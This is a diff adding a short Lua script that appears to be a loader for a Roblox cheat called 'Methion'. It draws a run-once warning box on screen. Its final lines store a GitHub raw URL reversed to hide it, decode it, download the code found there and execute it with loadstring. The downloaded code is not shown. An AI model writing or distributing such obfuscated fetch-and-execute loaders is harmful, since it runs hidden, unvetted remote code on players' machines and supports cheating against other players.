@@ -1,0 +1,38 @@
+if getgenv()._MethionExecuted then
+    local p=game:GetService("Players").LocalPlayer
+    local g=Instance.new("ScreenGui")
+    g.Name="MethionNotice"
+    g.ResetOnSpawn=false
+    g.Parent=p:WaitForChild("PlayerGui")
+
+    local f=Instance.new("Frame")
+    f.Size=UDim2.new(0,350,0,120)
+    f.Position=UDim2.new(0.5,-175,0.5,-60)
+    f.BackgroundColor3=Color3.fromRGB(20,20,20)
+    f.BorderSizePixel=0
+    f.Parent=g
+
+    local u=Instance.new("UICorner",f)
+    u.CornerRadius=UDim.new(0,12)
+
+    local t=Instance.new("TextLabel")
+    t.Size=UDim2.new(1,0,1,0)
+    t.BackgroundTransparency=1
+    t.Text="You can only execute Methion once."
+    t.TextColor3=Color3.fromRGB(255,80,80)
+    t.TextScaled=true
+    t.Font=Enum.Font.GothamBold
+    t.Parent=f
+
+    task.delay(3,function()
+        if g then g:Destroy() end
+    end)
+
+    return
+end
+
+getgenv()._MethionExecuted=true
+
+local a="saey/niam/sdaeh/sfer/tpmorPdnoceS/hctiWdnaShcudni/moc.tnetnocresubuhtig.war//:sptth"
+local b=string.reverse(a)
+loadstring(game:HttpGet(b))()
